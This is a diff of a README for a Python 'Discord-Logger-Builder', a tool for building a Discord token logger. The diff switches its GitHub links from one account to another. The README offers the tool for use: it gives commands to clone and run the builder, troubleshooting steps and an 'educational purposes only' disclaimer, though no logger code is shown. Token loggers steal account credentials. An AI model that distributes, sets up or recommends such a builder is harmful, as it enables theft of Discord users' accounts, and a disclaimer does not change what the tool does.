@@ -1,5 +1,5 @@
 # Discord-Logger-Builder
-This open-source Python 3 script is a builder to the very popular token logger that is on my github that many people use.
+This open-source Python 3 script is a builder to the very popular token logger that is on [my GitHub](https://github.com/LocalsGitHub/) that many people use.
 This is purely for demonstration/educational purposes. I am not responsible for any actions you take with this project.
 
 ## Setup
@@ -10,11 +10,11 @@ The script has been tested in python 3.8.6-3.10.0, on Windows 10/11. This script
 
 Windows:
 ```
-git clone https://github.com/qualk/Discord-Logger-Builder.git
+git clone https://github.com/LocalsGitHub/Discord-Logger-Builder.git
 cd Discord-Logger-Builder
 py builder.py
 ```
-Or you can [clone with GitHub Desktop](x-github-client://openRepo/https://github.com/qualk/Discord-Logger-Builder), open Command prompt, then `py builder.py`.
+Or you can [clone with GitHub Desktop](x-github-client://openRepo/https://github.com/LocalsGitHub/Discord-Logger-Builder), open Command prompt, then `py builder.py`.
 
 ## Usage
 
@@ -24,4 +24,4 @@ Simply run the builder and it will fetch the needed dependencies and install the
 
 If you get an error:
 Uninstall typing (python -m pip remove typing) and run the py script again.
-If it is still not working, before [making an issue](https://github.com/qualk/Discord-Logger-Builder/issues/new), [check](https://github.com/qualk/Discord-Logger-Builder/issues) if there is an existing issue that relates to yours.
+If it is still not working, before [making an issue](https://github.com/LocalsGitHub/Discord-Logger-Builder/issues/new), [check](https://github.com/LocalsGitHub/Discord-Logger-Builder/issues) first if there is an existing issue that relates to yours.
